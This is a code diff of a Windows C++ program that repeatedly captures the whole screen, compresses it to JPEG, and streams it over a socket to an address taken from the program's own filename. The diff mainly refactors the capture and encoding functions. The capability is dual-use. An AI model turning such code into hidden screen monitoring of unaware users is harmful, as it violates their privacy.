@@ -8,33 +8,28 @@ using namespace std;
 #include <winsock.h>
 #include <fstream>
 #include <string>
+#include <vector>
 
 #pragma warning( disable : 4996)
 #pragma comment(lib, "Ws2_32.lib")
 #pragma comment(lib, "GdiPlus.lib")
 using namespace Gdiplus;
 
-HBITMAP getImage()
+void readIp(char* argv[], char *ip, int& port)
 {
-    GdiplusStartupInput gdiplusStartupInput;
-    ULONG_PTR gdiplusToken;
-    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
+    char chport[5];
+    int i = 0;
 
-    HDC scrdc, memdc;
-    HBITMAP membit;
-    scrdc = GetDC(0);
-    int Height, Width;
-    ::SetThreadDpiAwarenessContext(DPI_AWARENESS_CONTEXT_SYSTEM_AWARE);
-    Height = GetSystemMetrics(SM_CYSCREEN);
-    Width = GetSystemMetrics(SM_CXSCREEN);
-    memdc = CreateCompatibleDC(scrdc);
-    membit = CreateCompatibleBitmap(scrdc, Width, Height);
-    SelectObject(memdc, membit);
-
-    BitBlt(memdc, 0, 0, Width, Height, scrdc, 0, 0, SRCCOPY);
-    HBITMAP hBitmap;
-    hBitmap = (HBITMAP)SelectObject(memdc, membit);
-    return hBitmap;
+    for (; i < 4; ++i)
+        chport[i] = argv[0][i];
+    sscanf_s(chport, "%d", &port);
+    int k = 0;
+    while (argv[0][i])
+    {
+        ip[k] = argv[0][i];
+        ++k; ++i;
+    }
+    ip[k] = '\0';
 }
 
 int GetEncoderClsid(const WCHAR* format, CLSID* pClsid)
@@ -68,11 +63,13 @@ int GetEncoderClsid(const WCHAR* format, CLSID* pClsid)
     return -1;  // Failure
 }
 
-char* convertImage(Gdiplus::Bitmap& image, int& buferSize)
+bool save_png_memory(HBITMAP hbitmap, std::vector<char>& data)
 {
-    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
-    ULONG_PTR gdiplusToken;
-    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
+    Gdiplus::Bitmap bmp(hbitmap, nullptr);
+
+    //write to IStream
+    IStream* istream = nullptr;
+    CreateStreamOnHGlobal(NULL, TRUE, &istream);
 
     CLSID   encoderClsid;
     Status  stat;
@@ -88,44 +85,27 @@ char* convertImage(Gdiplus::Bitmap& image, int& buferSize)
 
     quality = 15;
     encoderParameters.Parameter[0].Value = &quality;
+    GetEncoderClsid(L"image/jpeg", &encoderClsid);
 
-    IStream* istream = nullptr;
-    HRESULT hr = CreateStreamOnHGlobal(NULL, TRUE, &istream);
-    CLSID clsid_png;
-    CLSIDFromString(L"{557cf406-1a04-11d3-9a73-0000f81ef32e}", &clsid_png);
-    image.Save(istream, &encoderClsid, &encoderParameters);
+    Gdiplus::Status status = bmp.Save(istream, &encoderClsid, &encoderParameters);
+    if (status != Gdiplus::Status::Ok)
+        return false;
 
+    //get memory handle associated with istream
     HGLOBAL hg = NULL;
     GetHGlobalFromStream(istream, &hg);
-    int bufsize = GlobalSize(hg);
-    char* buffer = new char[bufsize];
 
-    LPVOID ptr = GlobalLock(hg);
-    memcpy(buffer, ptr, bufsize);
+    //copy IStream to buffer
+    int bufsize = GlobalSize(hg);
+    data.resize(bufsize);
+
+    //lock & unlock memory
+    LPVOID pimage = GlobalLock(hg);
+    memcpy(&data[0], pimage, bufsize);
     GlobalUnlock(hg);
 
     istream->Release();
-
-    GdiplusShutdown(gdiplusToken);
-    buferSize = bufsize;
-    return buffer;
-}
-
-void readIp(char* argv[], char *ip, int& port)
-{
-    char chport[5];
-    int i = 0;
-
-    for (; i < 4; ++i)
-        chport[i] = argv[0][i];
-    sscanf_s(chport, "%d", &port);
-    int k = 0;
-    while (argv[0][i])
-    {
-        ip[k] = argv[0][i];
-        ++k; ++i;
-    }
-    ip[k] = '\0';
+    return true;
 }
 
 int main(int argc, char* argv[])
@@ -163,42 +143,59 @@ int main(int argc, char* argv[])
 
     while (true)
     {
-        // Get image:
-        HBITMAP hBitmap = getImage();
-        Gdiplus::Bitmap bitmap(hBitmap, NULL);
+        //--------------------------------------------------------------
+        CoInitialize(NULL);
 
-        int bufSize = 0;
-        char* buffer = convertImage(bitmap, bufSize);
-        DeleteObject(hBitmap);
+        ULONG_PTR token;
+        Gdiplus::GdiplusStartupInput tmp;
+        Gdiplus::GdiplusStartup(&token, &tmp, NULL);
 
-        char imagePartBuffer[imagePartSize];
+        //take screenshot
+        RECT rc;
+        GetClientRect(GetDesktopWindow(), &rc);
+        auto hdc = GetDC(0);
+        auto memdc = CreateCompatibleDC(hdc);
+        auto hbitmap = CreateCompatibleBitmap(hdc, rc.right, rc.bottom);
+        auto oldbmp = SelectObject(memdc, hbitmap);
+        BitBlt(memdc, 0, 0, rc.right, rc.bottom, hdc, 0, 0, SRCCOPY);
+        SelectObject(memdc, oldbmp);
+        DeleteDC(memdc);
+        ReleaseDC(0, hdc);
 
-        std::string imageInfo;
-        imageInfo = std::to_string(bufSize);
-        for (int i = 0; i < imageInfo.size(); ++i)
+        //save as png
+        std::vector<char> data;
+        if (save_png_memory(hbitmap, data))
         {
-            sendingImageInfo[i] = imageInfo[i];
+            std::string imageInfo;
+            imageInfo = std::to_string(data.size());
+            for (int i = 0; i < imageInfo.size(); ++i)
+            {
+                sendingImageInfo[i] = imageInfo[i];
+            }
+            sendingImageInfo[imageInfo.size()] = '\0';
+
+            int ImagePartCounter = 0;
+
+            check = send(s, start, 10, 0);
+
+            if (check != 10)
+                exit(0);
+
+            check = send(s, sendingImageInfo, 50, 0);
+
+            if (check != 50)
+                exit(0);
+
+            check = send(s, data.data(), data.size(), 0);
+
+            if (check != data.size())
+                exit(0);
         }
-        sendingImageInfo[imageInfo.size()] = '\0';
+        DeleteObject(hbitmap);
 
-        int ImagePartCounter = 0;
-
-        check = send(s, start, 10, 0);
-
-        if (check != 10)
-            exit(0);
-
-        check = send(s, sendingImageInfo, 50, 0);
-
-        if (check != 50)
-            exit(0);
-
-        check = send(s, buffer, bufSize, 0);
-
-        if (check != bufSize)
-            exit(0);
-
-        delete[] buffer;
+        Gdiplus::GdiplusShutdown(token);
+        CoUninitialize();
+        //--------------------------------------------------------------
         Sleep(40);
     }
 }
